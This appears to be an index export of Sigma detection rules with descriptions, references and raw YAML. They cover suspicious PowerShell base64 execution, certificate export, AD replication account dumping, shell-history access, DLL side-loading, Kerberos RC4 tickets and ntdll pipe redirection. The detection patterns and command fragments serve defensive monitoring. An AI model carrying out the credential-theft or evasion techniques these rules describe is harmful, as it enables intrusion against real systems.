https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/ https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/ Raw rule (edit) title: Suspicious Execution of Powershell with Base64 id: fb843269-508c-4b76-8b8d-88679db22ce7 status: experimental description: Commandline to lauch powershell with a base64 payload author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets - https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/ - https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/ date: 2022/01/02 modified: 2022/02/10 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\powershell.exe CommandLine|contains: - \u0026#39; -e \u0026#39; - \u0026#39; -en \u0026#39; - \u0026#39; -enc \u0026#39; - \u0026#39; -enco\u0026#39; - \u0026#39; -ec \u0026#39; filter: CommandLine|contains: - \u0026#39; -Encoding \u0026#39; condition: selection and not filter falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059.001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_powershell_encode.yml/","tags":["attack.execution","attack.t1059.001"],"title":"Suspicious Execution of Powershell with Base64"},{"categories":null,"contents":"Use of the commandline to shutdown or reboot windows\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown Raw rule (edit) title: Suspicious Execution of Shutdown id: 34ebb878-1b15-4895-b352-ca2eeb99b274 status: experimental description: Use of the commandline to shutdown or reboot windows author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\shutdown.exe CommandLine|contains: - \u0026#39;/r \u0026#39; - \u0026#39;/s \u0026#39; condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1529 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_shutdown.yml/","tags":["attack.impact","attack.t1529"],"title":"Suspicious Execution of Shutdown"},{"categories":null,"contents":"Use of systeminfo to get information\nKnown false-positives Unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-1---system-information-discovery https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo Raw rule (edit) title: Suspicious Execution of Systeminfo id: 0ef56343-059e-4cb6-adc1-4c3c967c5e46 status: experimental description: Use of systeminfo to get information author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-1---system-information-discovery - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo date: 2022/01/01 logsource: category: process_creation product: windows detection: selection: Image|endswith: \\systeminfo.exe condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1082 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_systeminfo.yml/","tags":["attack.discovery","attack.t1082"],"title":"Suspicious Execution of Systeminfo"},{"categories":null,"contents":"Detects Commandlet that is used to export certificates from the local certificate store and sometimes used by threat actors to steal private keys from compromised machines\nKnown false-positives Legitimate certificate exports invoked by administrators or users (depends on processes in the environment - filter if unusable) References https://us-cert.cisa.gov/ncas/analysis-reports/ar21-112a https://docs.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate Raw rule (edit) title: Suspicious Export-PfxCertificate id: aa7a3fce-bef5-4311-9cc1-5f04bb8c308c status: experimental description: Detects Commandlet that is used to export certificates from the local certificate store and sometimes used by threat actors to steal private keys from compromised machines references: - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-112a - https://docs.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate tags: - attack.credential_access - attack.t1552.004 author: Florian Roth date: 2021/04/23 modified: 2021/08/04 logsource: product: windows category: ps_script definition: Script Block Logging must be enable detection: PfxCertificate: ScriptBlockText|contains: \u0026#39;Export-PfxCertificate\u0026#39; condition: PfxCertificate falsepositives: - Legitimate certificate exports invoked by administrators or users (depends on processes in the environment - filter if unusable) level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_export_pfxcertificate.yml/","tags":["attack.credential_access","attack.t1552.004"],"title":"Suspicious Export-PfxCertificate"},{"categories":null,"contents":"Detects renamed ftp.exe, ftp.exe script execution and child processes ran by ftp.exe\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml Raw rule (edit) title: Suspicious ftp.exe id: 06b401f4-107c-4ff9-947f-9ec1e7649f1e status: test description: Detects renamed ftp.exe, ftp.exe script execution and child processes ran by ftp.exe author: Victor Sergeev, oscd.community references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: ftp_path: Image|endswith: \u0026#39;ftp.exe\u0026#39; ftp_metadata: OriginalFileName|contains: \u0026#39;ftp.exe\u0026#39; cmd_with_script_modifier: CommandLine|contains: \u0026#39;-s:\u0026#39; parent_path: ParentImage|endswith: \u0026#39;ftp.exe\u0026#39; condition: (ftp_path and cmd_with_script_modifier) or (ftp_metadata and cmd_with_script_modifier) or (ftp_metadata and not ftp_path) or parent_path fields: - CommandLine - ParentImage falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059 - attack.defense_evasion - attack.t1202 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_ftp.yml/","tags":["attack.execution","attack.t1059","attack.defense_evasion","attack.t1202"],"title":"Suspicious ftp.exe"},{"categories":null,"contents":"The DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation.\nKnown false-positives Legitimate PowerShell scripts References https://www.powershellgallery.com/packages/DSInternals https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.md#atomic-test-2---run-dsinternals-get-adreplaccount Raw rule (edit) title: Suspicious Get-ADReplAccount id: 060c3ef1-fd0a-4091-bf46-e7d625f60b73 status: experimental description: The DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation. date: 2022/02/06 author: frack113 references: - https://www.powershellgallery.com/packages/DSInternals - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.md#atomic-test-2---run-dsinternals-get-adreplaccount logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - Get-ADReplAccount - \u0026#39;-All \u0026#39; - \u0026#39;-Server \u0026#39; condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.credential_access - attack.t1003.006 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_get_adreplaccount.yml/","tags":["attack.credential_access","attack.t1003.006"],"title":"Suspicious Get-ADReplAccount"},{"categories":null,"contents":"Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks\nKnown false-positives Execution of tools named GUP.exe and located in folders different than Notepad++\\updater References https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html Raw rule (edit) title: Suspicious GUP Usage id: 0a4f6091-223b-41f6-8743-f322ec84930b status: test description: Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks author: Florian Roth references: - https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html date: 2019/02/06 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\GUP.exe\u0026#39; filter: Image|endswith: - \u0026#39;\\Users\\\\*\\AppData\\Local\\Notepad++\\updater\\GUP.exe\u0026#39; - \u0026#39;\\Users\\\\*\\AppData\\Roaming\\Notepad++\\updater\\GUP.exe\u0026#39; - \u0026#39;\\Program Files\\Notepad++\\updater\\GUP.exe\u0026#39; - \u0026#39;\\Program Files (x86)\\Notepad++\\updater\\GUP.exe\u0026#39; condition: selection and not filter falsepositives: - Execution of tools named GUP.exe and located in folders different than Notepad++\\updater level: high tags: - attack.defense_evasion - attack.t1574.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_gup.yml/","tags":["attack.defense_evasion","attack.t1574.002"],"title":"Suspicious GUP Usage"},{"categories":null,"contents":"Detects commandline operations on shell history files\nKnown false-positives Legitimate administrative activity Ligitimate software, cleaning hist file References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.003/T1552.003.md Raw rule (edit) title: \u0026#39;Suspicious History File Operations\u0026#39; id: eae8ce9f-bde9-47a6-8e79-f20d18419910 status: test description: \u0026#39;Detects commandline operations on shell history files\u0026#39; author: \u0026#39;Mikhail Larin, oscd.community\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.003/T1552.003.md date: 2020/10/17 modified: 2021/11/27 logsource: product: linux service: auditd detection: execve: type: EXECVE history: - \u0026#39;.bash_history\u0026#39; - \u0026#39;.zsh_history\u0026#39; - \u0026#39;.zhistory\u0026#39; - \u0026#39;.history\u0026#39; - \u0026#39;.sh_history\u0026#39; - \u0026#39;fish_history\u0026#39; condition: execve and history fields: - a0 - a1 - a2 - a3 - key falsepositives: - \u0026#39;Legitimate administrative activity\u0026#39; - \u0026#39;Ligitimate software, cleaning hist file\u0026#39; level: medium tags: - attack.credential_access - attack.t1552.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/auditd/lnx_auditd_susp_histfile_operations.yml/","tags":["attack.credential_access","attack.t1552.003"],"title":"Suspicious History File Operations"},{"categories":null,"contents":"Detects commandline operations on shell history files\nKnown false-positives Legitimate administrative activity Ligitimate software, cleaning hist file References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.003/T1552.003.md Raw rule (edit) title: \u0026#39;Suspicious History File Operations\u0026#39; id: 508a9374-ad52-4789-b568-fc358def2c65 status: test description: \u0026#39;Detects commandline operations on shell history files\u0026#39; author: \u0026#39;Mikhail Larin, oscd.community\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.003/T1552.003.md date: 2020/10/17 modified: 2021/11/27 logsource: product: macos category: process_creation detection: selection: CommandLine|contains: - \u0026#39;.bash_history\u0026#39; - \u0026#39;.zsh_history\u0026#39; - \u0026#39;.zhistory\u0026#39; - \u0026#39;.history\u0026#39; - \u0026#39;.sh_history\u0026#39; - \u0026#39;fish_history\u0026#39; condition: selection falsepositives: - \u0026#39;Legitimate administrative activity\u0026#39; - \u0026#39;Ligitimate software, cleaning hist file\u0026#39; level: medium tags: - attack.credential_access - attack.t1552.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/macos/process_creation/proc_creation_macos_susp_histfile_operations.yml/","tags":["attack.credential_access","attack.t1552.003"],"title":"Suspicious History File Operations"},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported suspicious email forwarding rules, for example, if a user created an inbox rule that forwards a copy of all emails to an external address.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Suspicious Inbox Forwarding id: 6c220477-0b5b-4b25-bb90-66183b4089e8 status: experimental description: Detects when a Microsoft Cloud App Security reported suspicious email forwarding rules, for example, if a user created an inbox rule that forwards a copy of all emails to an external address. author: Austin Songer @austinsonger date: 2021/08/22 references: - https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy - https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference logsource: category: ThreatManagement product: m365 detection: selection: eventSource: SecurityComplianceCenter eventName: \u0026#39;Suspicious inbox forwarding\u0026#39; status: success condition: selection falsepositives: - Unknown level: low tags: - attack.exfiltration - attack.t1020 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/cloud/m365/microsoft365_suspicious_inbox_forwarding.yml/","tags":["attack.exfiltration","attack.t1020"],"title":"Suspicious Inbox Forwarding"},{"categories":null,"contents":"Detects the creation of files that indicator an interactive use of PowerShell in the SYSTEM user context\nKnown false-positives Administrative activity PowerShell scripts running as SYSTEM user References https://jpcertcc.github.io/ToolAnalysisResultSheet/details/PowerSploit_Invoke-Mimikatz.htm Raw rule (edit) title: Suspicious Interactive PowerShell as SYSTEM id: 5b40a734-99b6-4b98-a1d0-1cea51a08ab2 status: experimental description: Detects the creation of files that indicator an interactive use of PowerShell in the SYSTEM user context author: Florian Roth references: - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/PowerSploit_Invoke-Mimikatz.htm date: 2021/12/07 logsource: product: windows category: file_event detection: selection: TargetFilename: - \u0026#39;C:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\u0026#39; - \u0026#39;C:\\Windows\\System32\\config\\systemprofile\\AppData\\\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-Interactive\u0026#39; condition: selection falsepositives: - Administrative activity - PowerShell scripts running as SYSTEM user level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/file_event/file_event_win_susp_system_interactive_powershell.yml/","tags":null,"title":"Suspicious Interactive PowerShell as SYSTEM"},{"categories":null,"contents":"Adversaries may abuse container files such as disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW.\nKnown false-positives Legitimate PowerShell scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.md#atomic-test-2---mount-an-iso-image-and-run-executable-from-the-iso https://docs.microsoft.com/en-us/powershell/module/storage/mount-diskimage?view=windowsserver2022-ps Raw rule (edit) title: Suspicious Invoke-Item From Mount-DiskImage id: 902cedee-0398-4e3a-8183-6f3a89773a96 status: experimental description: Adversaries may abuse container files such as disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. date: 2022/02/01 author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.md#atomic-test-2---mount-an-iso-image-and-run-executable-from-the-iso - https://docs.microsoft.com/en-us/powershell/module/storage/mount-diskimage?view=windowsserver2022-ps logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - \u0026#39;Mount-DiskImage \u0026#39; - \u0026#39;-ImagePath \u0026#39; - Get-Volume - \u0026#39;.DriveLetter\u0026#39; - \u0026#39;invoke-item \u0026#39; - \u0026#39;):\\\u0026#39; condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.defense_evasion - attack.t1553.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_run_from_mount_diskimage.yml/","tags":["attack.defense_evasion","attack.t1553.005"],"title":"Suspicious Invoke-Item From Mount-DiskImage"},{"categories":null,"contents":"Open a handle on the drive volume via the \\.\\ DOS device path specifier and perform direct access read of the first few bytes of the volume.\nKnown false-positives Legitimate PowerShell scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1006/T1006.md Raw rule (edit) title: Suspicious IO.FileStream id: 70ad982f-67c8-40e0-a955-b920c2fa05cb status: experimental description: Open a handle on the drive volume via the \\\\.\\ DOS device path specifier and perform direct access read of the first few bytes of the volume. date: 2022/01/09 modified: 2022/03/05 author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1006/T1006.md logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - New-Object - IO.FileStream - \u0026#39;\\\\\\\\.\\\\\u0026#39; condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.defense_evasion - attack.t1070.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_iofilestream.yml/","tags":["attack.defense_evasion","attack.t1070.003"],"title":"Suspicious IO.FileStream"},{"categories":null,"contents":"Detects service ticket requests using RC4 encryption type\nKnown false-positives Service accounts used on legacy systems (e.g. NetApp) Windows Domains with DFL 2003 and legacy systems References https://adsecurity.org/?p=3458 https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity Raw rule (edit) title: Suspicious Kerberos RC4 Ticket Encryption id: 496a0e47-0a33-4dca-b009-9e6ca3591f39 status: experimental references: - https://adsecurity.org/?p=3458 - https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity tags: - attack.credential_access - attack.t1558.003 description: Detects service ticket requests using RC4 encryption type author: Florian Roth date: 2017/02/06 modified: 2021/08/14 logsource: product: windows service: security detection: selection: EventID: 4769 TicketOptions: \u0026#39;0x40810000\u0026#39; TicketEncryptionType: \u0026#39;0x17\u0026#39; reduction: ServiceName|startswith: \u0026#39;$\u0026#39; condition: selection and not reduction falsepositives: - Service accounts used on legacy systems (e.g. NetApp) - Windows Domains with DFL 2003 and legacy systems level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_rc4_kerberos.yml/","tags":["attack.credential_access","attack.t1558.003"],"title":"Suspicious Kerberos RC4 Ticket Encryption"},{"categories":null,"contents":"Detects the load of advapi31.dll by a process running in an uncommon folder\nKnown false-positives unknown References https://github.com/hlldz/Phant0m Raw rule (edit) title: Suspicious Load of Advapi31.dll id: d813d662-785b-42ca-8b4a-f7457d78d5a9 status: experimental description: Detects the load of advapi31.dll by a process running in an uncommon folder author: frack113 references: - https://github.com/hlldz/Phant0m date: 2022/02/03 modified: 2022/02/11 logsource: product: windows category: image_load detection: selection: ImageLoaded|endswith: \u0026#39;\\advapi32.dll\u0026#39; filter_common: Image|startswith: - \u0026#39;C:\\Windows\\\u0026#39; - \u0026#39;C:\\Program Files (x86)\\\u0026#39; - \u0026#39;C:\\Program Files\\\u0026#39; filter_defender: Image|startswith: \u0026#39;C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\\u0026#39; Image|endswith: \u0026#39;\\MpCmdRun.exe\u0026#39; filter_onedrive: Image|startswith: \u0026#39;C:\\Users\\\u0026#39; Image|contains: \u0026#39;\\AppData\\Local\\Microsoft\\OneDrive\\\u0026#39; Image|endswith: \u0026#39;FileCoAuth.exe\u0026#39; condition: selection and not 1 of filter_* falsepositives: - unknown level: informational tags: - attack.defense_evasion - attack.t1070 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/image_load/image_load_susp_advapi32_dll.yml/","tags":["attack.defense_evasion","attack.t1070"],"title":"Suspicious Load of Advapi31.dll"},{"categories":null,"contents":"Detects suspicious LOLBIN AccCheckConsole execution with parameters as used to load an arbitrary DLL\nKnown false-positives Legitimate use of the UI Accessibility Checker References https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340 https://twitter.com/bohops/status/1477717351017680899?s=12 Raw rule (edit) title: Suspicious LOLBIN AccCheckConsole id: 0f6da907-5854-4be6-859a-e9958747b0aa status: experimental description: Detects suspicious LOLBIN AccCheckConsole execution with parameters as used to load an arbitrary DLL references: - https://gist.github.com/bohops/2444129419c8acf837aedda5f0e7f340 - https://twitter.com/bohops/status/1477717351017680899?s=12 author: Florian Roth date: 2022/01/06 tags: - attack.execution logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\AccCheckConsole.exe\u0026#39; CommandLine|contains|all: - \u0026#39; -window \u0026#39; - \u0026#39;.dll\u0026#39; condition: selection falsepositives: - Legitimate use of the UI Accessibility Checker level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_acccheckconsole.yml/","tags":["attack.execution"],"title":"Suspicious LOLBIN AccCheckConsole"},{"categories":null,"contents":"Adversaries may abuse container files such as disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW.\nKnown false-positives Legitimate PowerShell scripts References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image https://docs.microsoft.com/en-us/powershell/module/storage/mount-diskimage?view=windowsserver2022-ps Raw rule (edit) title: Suspicious Mount-DiskImage id: 29e1c216-6408-489d-8a06-ee9d151ef819 status: experimental description: Adversaries may abuse container files such as disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. date: 2022/02/01 author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.005/T1553.005.md#atomic-test-1---mount-iso-image - https://docs.microsoft.com/en-us/powershell/module/storage/mount-diskimage?view=windowsserver2022-ps logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - \u0026#39;Mount-DiskImage \u0026#39; - \u0026#39;-ImagePath \u0026#39; condition: selection falsepositives: - Legitimate PowerShell scripts level: low tags: - attack.defense_evasion - attack.t1553.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_mount_diskimage.yml/","tags":["attack.defense_evasion","attack.t1553.005"],"title":"Suspicious Mount-DiskImage"},{"categories":null,"contents":"Detects multiple file rename or delete events occurrence within a specified period of time by a same user (these events may signalize about ransomware activity).\nKnown false-positives Software uninstallation Files restore activities References https://www.manageengine.com/data-security/how-to/how-to-detect-ransomware-attacks.html Raw rule (edit) title: Suspicious Multiple File Rename Or Delete Occurred id: 97919310-06a7-482c-9639-92b67ed63cf8 status: test description: Detects multiple file rename or delete events occurrence within a specified period of time by a same user (these events may signalize about ransomware activity). author: Vasiliy Burov, oscd.community references: - https://www.manageengine.com/data-security/how-to/how-to-detect-ransomware-attacks.html date: 2020/10/16 modified: 2021/11/27 logsource: product: windows service: security definition: \u0026#39;Requirements: Audit Policy : Policies/Windows Settings/Security Settings/Local Policies/Audit Policy/Audit object access, Policies/Windows Settings/Security Settings/Advanced Audit Policy Configuration/Object Access\u0026#39; detection: selection: EventID: 4663 ObjectType: \u0026#39;File\u0026#39; AccessList: \u0026#39;%%1537\u0026#39; Keywords: \u0026#39;0x8020000000000000\u0026#39; timeframe: 30s condition: selection | count() by SubjectLogonId \u0026gt; 10 falsepositives: - Software uninstallation - Files restore activities level: medium tags: - attack.impact - attack.t1486 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_multiple_files_renamed_or_deleted.yml/","tags":["attack.impact","attack.t1486"],"title":"Suspicious Multiple File Rename Or Delete Occurred"},{"categories":null,"contents":"Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems\nKnown false-positives administrator, hotline ask to user References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md#atomic-test-2---list-windows-firewall-rules Raw rule (edit) title: Suspicious Netsh Discovery Command id: 0e4164da-94bc-450d-a7be-a4b176179f1f status: experimental description: Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md#atomic-test-2---list-windows-firewall-rules author: frack113 date: 2021/12/07 logsource: category: process_creation product: windows detection: network_cmd: CommandLine|contains|all: - \u0026#39;netsh \u0026#39; - \u0026#39;advfirewall \u0026#39; - \u0026#39;firewall \u0026#39; - \u0026#39;show \u0026#39; - \u0026#39;rule \u0026#39; - \u0026#39;name=all\u0026#39; condition: network_cmd falsepositives: - administrator, hotline ask to user level: low tags: - attack.discovery - attack.t1016 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_netsh_command.yml/","tags":["attack.discovery","attack.t1016"],"title":"Suspicious Netsh Discovery Command"},{"categories":null,"contents":"Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems\nKnown false-positives administrator, hotline ask to user References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md#atomic-test-1---system-network-configuration-discovery-on-windows Raw rule (edit) title: Suspicious Network Command id: a29c1813-ab1f-4dde-b489-330b952e91ae status: experimental description: Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md#atomic-test-1---system-network-configuration-discovery-on-windows author: frack113 date: 2021/12/07 logsource: category: process_creation product: windows detection: network_cmd: CommandLine|contains: - \u0026#39;ipconfig /all\u0026#39; - \u0026#39;netsh interface show interface\u0026#39; - \u0026#39;arp -a\u0026#39; - \u0026#39;nbtstat -n\u0026#39; - \u0026#39;net config\u0026#39; condition: network_cmd falsepositives: - administrator, hotline ask to user level: low tags: - attack.discovery - attack.t1016 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_network_command.yml/","tags":["attack.discovery","attack.t1016"],"title":"Suspicious Network Command"},{"categories":null,"contents":"Adversaries may use to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\nKnown false-positives unknown References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md#atomic-test-2---map-admin-share-powershell https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.2 Raw rule (edit) title: Suspicious New-PSDrive to Admin Share id: 1c563233-030e-4a07-af8c-ee0490a66d3a description: Adversaries may use to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user. references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md#atomic-test-2---map-admin-share-powershell - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive?view=powershell-7.2 status: experimental author: frack113 date: 2022/01/01 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - \u0026#39;New-PSDrive\u0026#39; - \u0026#39;-psprovider \u0026#39; - \u0026#39;filesystem\u0026#39; - \u0026#39;-root \u0026#39; - \u0026#39;\\\\\u0026#39; - \u0026#39;$\u0026#39; condition: selection falsepositives: - unknown level: medium tags: - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_script/posh_ps_suspicious_new_psdrive.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"Suspicious New-PSDrive to Admin Share"},{"categories":null,"contents":"Detects suspicious use of the WSMAN provider without PowerShell.exe as the host application.\nKnown false-positives Unknown References https://twitter.com/chadtilbury/status/1275851297770610688 https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/ https://github.com/bohops/WSMan-WinRM Raw rule (edit) title: Suspicious Non PowerShell WSMAN COM Provider id: df9a0e0e-fedb-4d6c-8668-d765dfc92aa7 description: Detects suspicious use of the WSMAN provider without PowerShell.exe as the host application. status: experimental date: 2020/06/24 modified: 2021/08/30 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1059.001 - attack.lateral_movement - attack.t1021.003 references: - https://twitter.com/chadtilbury/status/1275851297770610688 - https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/ - https://github.com/bohops/WSMan-WinRM logsource: product: windows service: powershell-classic definition: fields have to be extract from event detection: selection: ProviderName: WSMan filter: HostApplication|contains: powershell condition: selection and not filter falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_classic/posh_pc_wsman_com_provider_no_powershell.yml/","tags":["attack.execution","attack.t1059.001","attack.lateral_movement","attack.t1021.003"],"title":"Suspicious Non PowerShell WSMAN COM Provider"},{"categories":null,"contents":"Detects command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection\nKnown false-positives Unknown References https://www.x86matthew.com/view_post?id=ntdll_pipe Raw rule (edit) title: Suspicious Ntdll Pipe Redirection id: bbc865e4-7fcd-45a6-8ff1-95ced28ec5b2 status: experimental description: Detects command that type the content of ntdll.dll to a different file or a pipe in order to evade AV / EDR detection references: - https://www.x86matthew.com/view_post?id=ntdll_pipe tags: - attack.defense_evasion author: Florian Roth date: 2022/03/05 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - \u0026#39;type %windir%\\system32\\ntdll.dll\u0026#39; - \u0026#39;type %systemroot%\\system32\\ntdll.dll\u0026#39; - \u0026#39;type c:\\windows\\system32\\ntdll.dll\u0026#39; - \u0026#39;\\\\ntdll.dll \u0026gt; \\\\\\\\.\\\\pipe\\\\\u0026#39; condition: selection falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_ntdll_type_redirect.yml/","tags":["attack.defense_evasion"],"title":"Suspicious Ntdll Pipe Redirection"},{"categories":null,"contents":"Detects when a Microsoft Cloud App Security reported when an app downloads multiple files from Microsoft SharePoint or Microsoft OneDrive in a manner that is unusual for the user.\nKnown false-positives Unknown References https://docs.microsoft.com/en-us/cloud-app-security/anomaly-detection-policy https://docs.microsoft.com/en-us/cloud-app-security/policy-template-reference Raw rule (edit) title: Suspicious OAuth App File Download Activities id: ee111937-1fe7-40f0-962a-0eb44d57d174 status: experimental description: Detects when a Microsoft Cloud App Security reported when an app downloads multiple files from Microsoft SharePoint or Microsoft OneDrive in a manner that is 